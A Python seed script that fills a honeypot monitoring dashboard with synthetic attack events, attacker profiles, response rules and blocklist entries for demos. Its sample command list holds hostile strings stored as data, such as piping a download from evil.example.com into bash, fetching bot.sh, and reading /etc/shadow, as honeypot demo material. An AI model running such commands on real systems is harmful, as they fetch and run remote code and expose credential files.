"""Seed script — populates the dashboard with synthetic events for demo/screenshots.

Section 3.2: Seed script to populate the dashboard with historical synthetic
events for demo/screenshot purposes without needing to wait for real attack traffic.

Usage: python -m scripts.seed_data
"""

from __future__ import annotations

import asyncio
import random
import uuid
from datetime import datetime, timedelta, timezone

from sqlalchemy import text

# ─── Synthetic data generators ───────────────────────────────────────────────

ATTACKER_IPS = [
    "203.0.113.45", "198.51.100.7", "192.0.2.100", "45.33.32.156",
    "185.220.101.42", "89.248.167.131", "171.25.193.9", "62.210.105.116",
    "159.65.136.20", "104.248.45.67", "178.128.22.11", "68.183.200.99",
    "142.93.12.34", "167.99.56.78", "206.189.90.12", "134.209.33.44",
    "95.216.77.88", "116.203.55.66", "49.12.99.11", "157.245.22.33",
]

GEO_DATA = {
    "203.0.113.45": {"country": "CN", "city": "Shanghai", "lat": 31.23, "lon": 121.47, "asn": "AS4134", "org": "Chinanet"},
    "198.51.100.7": {"country": "RU", "city": "Moscow", "lat": 55.75, "lon": 37.62, "asn": "AS12389", "org": "Rostelecom"},
    "192.0.2.100": {"country": "BR", "city": "São Paulo", "lat": -23.55, "lon": -46.63, "asn": "AS28573", "org": "Claro"},
    "45.33.32.156": {"country": "US", "city": "Fremont", "lat": 37.55, "lon": -122.05, "asn": "AS63949", "org": "Linode"},
    "185.220.101.42": {"country": "DE", "city": "Frankfurt", "lat": 50.11, "lon": 8.68, "asn": "AS205100", "org": "F3 Netze"},
    "89.248.167.131": {"country": "NL", "city": "Amsterdam", "lat": 52.37, "lon": 4.90, "asn": "AS202425", "org": "IP Volume"},
    "171.25.193.9": {"country": "SE", "city": "Stockholm", "lat": 59.33, "lon": 18.07, "asn": "AS198093", "org": "DFRI"},
    "62.210.105.116": {"country": "FR", "city": "Paris", "lat": 48.86, "lon": 2.35, "asn": "AS12876", "org": "Scaleway"},
    "159.65.136.20": {"country": "IN", "city": "Bangalore", "lat": 12.97, "lon": 77.59, "asn": "AS14061", "org": "DigitalOcean"},
    "104.248.45.67": {"country": "SG", "city": "Singapore", "lat": 1.35, "lon": 103.82, "asn": "AS14061", "org": "DigitalOcean"},
}

HONEYPOTS = [
    {"id": "cowrie-ssh-01", "type": "cowrie", "region": "us-east-1", "ip": "10.0.1.10"},
    {"id": "cowrie-ssh-02", "type": "cowrie", "region": "eu-west-1", "ip": "10.0.1.11"},
    {"id": "dionaea-01", "type": "dionaea", "region": "us-east-1", "ip": "10.0.1.20"},
    {"id": "wp-decoy-01", "type": "wp-decoy", "region": "us-east-1", "ip": "10.0.1.30"},
    {"id": "rdp-decoy-01", "type": "rdp-decoy", "region": "us-east-1", "ip": "10.0.1.40"},
    {"id": "smb-decoy-01", "type": "smb-decoy", "region": "us-east-1", "ip": "10.0.1.50"},
]

USERNAMES = ["root", "admin", "ubuntu", "test", "user", "postgres", "oracle", "guest", "pi", "ftpuser"]
PASSWORDS = ["password", "123456", "admin", "root", "toor", "pass", "1234", "qwerty", "letmein", "password123"]

COMMANDS = [
    "uname -a", "cat /etc/passwd", "wget http://malware.example.com/bot.sh",
    "curl http://evil.example.com/payload | bash", "id", "whoami",
    "ls -la /tmp", "ps aux", "crontab -l", "cat /etc/shadow",
    "history -c", "apt install nmap", "python -c 'import socket; ...'",
    "chmod 777 /tmp/bot.sh", "/tmp/bot.sh", "nmap -sV 192.168.1.0/24",
]

TECHNIQUES_MAP = {
    "login_attempt": ("brute_force", "T1110"),
    "command_exec": ("credential_reuse", "T1059"),
    "file_download": ("payload_drop", "T1105"),
    "exploit_probe": ("cve_exploit_attempt", "T1190"),
    "port_scan": (None, "T1046"),
}

SEVERITY_WEIGHTS = {"low": 35, "medium": 30, "high": 25, "critical": 10}


def _weighted_severity() -> str:
    return random.choices(
        list(SEVERITY_WEIGHTS.keys()),
        weights=list(SEVERITY_WEIGHTS.values()),
    )[0]


def _generate_burst(timestamp: datetime) -> list[dict]:
    """Generate a burst of synthetic events for a single session."""
    honeypot = random.choice(HONEYPOTS)
    attacker_ip = random.choice(ATTACKER_IPS)
    session_id = str(uuid.uuid4())
    
    events = []
    
    if honeypot["type"] == "cowrie":
        # 1 login
        events.append(_create_event_dict(timestamp, honeypot, attacker_ip, "login_attempt", session_id))
        
        # 2-5 commands
        for _ in range(random.randint(2, 5)):
            timestamp += timedelta(seconds=random.randint(1, 5))
            events.append(_create_event_dict(timestamp, honeypot, attacker_ip, "command_exec", session_id))
            
        if random.random() < 0.2:
            timestamp += timedelta(seconds=random.randint(1, 5))
            events.append(_create_event_dict(timestamp, honeypot, attacker_ip, "file_download", session_id))
            
    elif honeypot["type"] == "wp-decoy":
        for _ in range(random.randint(3, 8)):
            timestamp += timedelta(seconds=random.randint(1, 5))
            event_type = random.choices(["login_attempt", "exploit_probe"], weights=[70, 30])[0]
            events.append(_create_event_dict(timestamp, honeypot, attacker_ip, event_type, session_id))
            
    elif honeypot["type"] == "rdp-decoy":
        for _ in range(random.randint(3, 8)):
            timestamp += timedelta(seconds=random.randint(1, 5))
            event_type = random.choices(["login_attempt", "port_scan"], weights=[80, 20])[0]
            events.append(_create_event_dict(timestamp, honeypot, attacker_ip, event_type, session_id))
            
    else:
        for _ in range(random.randint(3, 8)):
            timestamp += timedelta(seconds=random.randint(1, 5))
            event_type = random.choice(["exploit_probe", "port_scan", "file_download", "login_attempt"])
            events.append(_create_event_dict(timestamp, honeypot, attacker_ip, event_type, session_id))
            
    return events

def _create_event_dict(timestamp: datetime, honeypot: dict, attacker_ip: str, event_type: str, session_id: str) -> dict:
    technique, mitre_id = TECHNIQUES_MAP.get(event_type, (None, None))

    # Generate payload
    if event_type == "login_attempt":
        payload = f"username={random.choice(USERNAMES)}, password={random.choice(PASSWORDS)}"
    elif event_type == "command_exec":
        payload = random.choice(COMMANDS)
    elif event_type == "file_download":
        payload = f"wget http://{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}/bot.sh"
    else:
        payload = f"Probe against {honeypot['type']} service"

    geo = GEO_DATA.get(attacker_ip, {"country": "XX", "city": "Unknown", "lat": 0, "lon": 0, "asn": "", "org": ""})
    abuse_score = random.randint(0, 100)

    summary = (
        f"{attacker_ip} attempted {event_type.replace('_', ' ')} against {honeypot['id']} "
        f"({honeypot['type']}) using {technique or 'unknown'} technique "
        f"(MITRE {mitre_id or 'N/A'}) from {geo['city']}, {geo['country']} "
        f"— severity: {_weighted_severity()}"
    )

    return {
        "id": str(uuid.uuid4()),
        "honeypot_id": honeypot["id"],
        "honeypot_type": honeypot["type"],
        "attacker_ip": attacker_ip,
        "geo": geo,
        "reputation": {"abuseipdb_score": abuse_score, "known_malicious": abuse_score >= 50},
        "event_type": event_type,
        "technique": technique,
        "mitre_attck_id": mitre_id,
        "payload": payload,
        "session_id": session_id,
        "timestamp": timestamp,
        "severity": _weighted_severity(),
        "summary_text": summary,
    }


async def seed_database(num_events: int = 500) -> None:
    """Seed the database with synthetic events, attackers, and honeypot instances."""
    import sys
    sys.path.insert(0, ".")

    from app.core.config import get_settings
    from app.db.session import async_session_factory, engine
    from app.models.models import (
        Attacker,
        Base,
        BlocklistEntry,
        Event,
        HoneypotInstance,
        ResponseRule,
    )

    # Create tables
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)

    print(f"Seeding {num_events} synthetic events...")

    async with async_session_factory() as session:
        # Seed honeypot instances
        for hp in HONEYPOTS:
            instance = HoneypotInstance(
                id=hp["id"],
                type=hp["type"],
                region=hp["region"],
                ip_address=hp["ip"],
                status="running",
                deployed_at=datetime.now(timezone.utc) - timedelta(days=7),
                last_heartbeat=datetime.now(timezone.utc),
                event_count=0,
            )
            session.add(instance)

        # Seed default response rules
        default_rules = [
            ResponseRule(
                name="SSH Brute Force Block",
                description="Block IPs after 5 failed SSH login attempts in 60 seconds",
                event_type="login_attempt",
                honeypot_type="cowrie",
                threshold_count=5,
                threshold_window_seconds=60,
                block_duration_hours=24,
                is_enabled=True,
            ),
            ResponseRule(
                name="Critical Event Auto-Block",
                description="Immediately block any IP generating critical severity events",
                severity_filter="critical",
                threshold_count=1,
                threshold_window_seconds=3600,
                block_duration_hours=48,
                is_enabled=True,
            ),
            ResponseRule(
                name="Multi-Honeypot Scanner Block",
                description="Block IPs probing multiple honeypots (indicates reconnaissance)",
                threshold_count=10,
                threshold_window_seconds=300,
                block_duration_hours=72,
                is_enabled=True,
            ),
            ResponseRule(
                name="RDP Brute Force Block",
                description="Block RDP brute force attempts",
                event_type="login_attempt",
                honeypot_type="rdp-decoy",
                threshold_count=3,
                threshold_window_seconds=60,
                block_duration_hours=24,
                is_enabled=True,
            ),
        ]
        for rule in default_rules:
            session.add(rule)

        # Generate events spread over the last 48 hours
        now = datetime.now(timezone.utc)
        attacker_stats: dict[str, dict] = {}
        from app.services.enrichment.session_builder import upsert_session_from_event

        events_generated = 0
        while events_generated < num_events:
            # Distribute events with higher density in recent hours
            hours_ago = random.expovariate(0.15)  # Exponential distribution
            hours_ago = min(hours_ago, 48)
            timestamp = now - timedelta(hours=hours_ago)

            burst = _generate_burst(timestamp)
            for event_data in burst:
                ip = event_data["attacker_ip"]

                # Track attacker stats
                if ip not in attacker_stats:
                    attacker_stats[ip] = {
                        "first_seen": event_data["timestamp"],
                        "last_seen": event_data["timestamp"],
                        "total_events": 0,
                        "honeypots_hit": set(),
                        "techniques_used": set(),
                        "geo": event_data["geo"],
                        "reputation": event_data["reputation"],
                    }
                stats = attacker_stats[ip]
                stats["total_events"] += 1
                if event_data["timestamp"] < stats["first_seen"]:
                    stats["first_seen"] = event_data["timestamp"]
                if event_data["timestamp"] > stats["last_seen"]:
                    stats["last_seen"] = event_data["timestamp"]
                stats["honeypots_hit"].add(event_data["honeypot_id"])
                if event_data["technique"]:
                    stats["techniques_used"].add(event_data["technique"])

                # Create event record
                event = Event(
                    id=uuid.UUID(event_data["id"]),
                    honeypot_id=event_data["honeypot_id"],
                    honeypot_type=event_data["honeypot_type"],
                    attacker_ip=ip,
                    geo=event_data["geo"],
                    reputation=event_data["reputation"],
                    event_type=event_data["event_type"],
                    technique=event_data["technique"],
                    mitre_attck_id=event_data["mitre_attck_id"],
                    payload=event_data["payload"],
                    session_id=uuid.UUID(event_data["session_id"]),
                    timestamp=event_data["timestamp"],
                    severity=event_data["severity"],
                    summary_text=event_data["summary_text"],
                )
                # Ensure the Session record exists before inserting the Event to satisfy FK constraints
                await upsert_session_from_event(session, event_data, event_data["timestamp"])
                session.add(event)

                events_generated += 1
                if events_generated % 100 == 0:
                    print(f"  Generated {events_generated}/{num_events} events...")
                
                if events_generated >= num_events:
                    break

        # Create attacker records
        for ip, stats in attacker_stats.items():
            honeypots = list(stats["honeypots_hit"])
            techniques = list(stats["techniques_used"])
            threat_score = min(100.0, (
                min(30.0, stats["total_events"] * 2.0) +
                min(20.0, len(honeypots) * 5.0) +
                min(20.0, len(techniques) * 4.0) +
                min(30.0, stats["reputation"].get("abuseipdb_score", 0) * 0.3)
            ))

            attacker = Attacker(
                ip=ip,
                first_seen=stats["first_seen"],
                last_seen=stats["last_seen"],
                total_events=stats["total_events"],
                honeypots_hit=honeypots,
                techniques_used=techniques,
                geo=stats["geo"],
                reputation=stats["reputation"],
                threat_score=threat_score,
                is_blocked=random.random() < 0.15,  # ~15% are blocked
            )
            session.add(attacker)

        # Create a few blocklist entries
        blocked_ips = random.sample(ATTACKER_IPS, 3)
        for ip in blocked_ips:
            entry = BlocklistEntry(
                ip=ip,
                blocked_at=now - timedelta(hours=random.randint(1, 24)),
                expires_at=now + timedelta(hours=random.randint(1, 48)),
                reason=f"Auto-blocked: exceeded brute force threshold",
                rule_triggered="SSH Brute Force Block",
                action_taken="sg-rule:sg-demo:x.x.x.x/32",
                is_active=True,
            )
            session.add(entry)

        await session.commit()

    # Update honeypot event counts
    async with async_session_factory() as session:
        for hp in HONEYPOTS:
            result = await session.execute(
                text("SELECT COUNT(*) FROM events WHERE honeypot_id = :hid"),
                {"hid": hp["id"]},
            )
            count = result.scalar() or 0
            await session.execute(
                text("UPDATE honeypot_instances SET event_count = :count WHERE id = :hid"),
                {"count": count, "hid": hp["id"]},
            )
        await session.commit()

    print(f"\n✅ Seeded {num_events} events, {len(attacker_stats)} attackers, "
          f"{len(HONEYPOTS)} honeypots, {len(default_rules)} response rules, "
          f"{len(blocked_ips)} blocklist entries")


if __name__ == "__main__":
    import sys
    num = int(sys.argv[1]) if len(sys.argv) > 1 else 500
    asyncio.run(seed_database(num))
